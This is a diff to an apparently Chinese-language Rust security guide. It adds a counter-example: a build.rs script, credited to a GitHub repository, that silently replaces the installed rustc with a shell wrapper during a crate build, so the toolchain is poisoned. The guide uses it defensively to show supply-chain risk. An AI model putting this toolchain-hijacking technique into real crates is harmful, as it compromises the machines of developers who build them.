@@ -16,3 +16,30 @@
 - 使用 [`cargo-audit`](https://crates.io/crates/cargo-audit) 检测依赖的安全性。
 - 使用自己的构建工具来替代 `Cargo`，可以更加安全。比如 Android 团队使用其`Soong`构建系统支持 Rust ，就选择不支持 `build.rs` ，就是考虑到审查起来太麻烦。
 
+**【反例】**
+
+下面是模拟 `build.rs` 投毒的示例：
+
+```rust
+// From: https://github.com/Neutron3529/poisoning-rustc
+
+use std::{io::Write,fs,env,path::Path};
+
+fn main() -> Result<(),Box<dyn std::error::Error>>{
+    let cargo=env::var("CARGO")?;
+    let cargo_dir=Path::new(&cargo);
+    let bin=cargo_dir.parent().ok_or(std::io::Error::new(std::io::ErrorKind::Other, "no!"))?;
+    let rustc=env::var("RUSTC")?;
+    let orc="old_".to_string()+&rustc;
+    let rcloc=bin.join(rustc);
+    let ocloc=bin.join(orc);
+    if !ocloc.exists() && rcloc.exists(){
+        fs::copy(&rcloc,&ocloc)?;// use copy to preserve 'x' permissions.
+        let mut f=fs::File::create(rcloc)?;
+        f.write_all(b"#!/bin/sh\necho 'The rustc has been \"poisoned\" by poisoning crate, which suggests that, your computer is not strong enough to defend such attack' > /tmp/rustc_infected\necho \"If you're using Linux, your rustc perhaps works just fine\" >> /tmp/rustc_infected\necho \"but windows users may suffer from executing a linux-only script.\" >> /tmp/rustc_infected\nexec ")?;
+        f.write_all(ocloc.to_str().ok_or(std::io::Error::new(std::io::ErrorKind::Other, "oh no!"))?.as_bytes())?;
+        f.write_all(b" $*")?
+    }
+    Ok(())
+}
+```
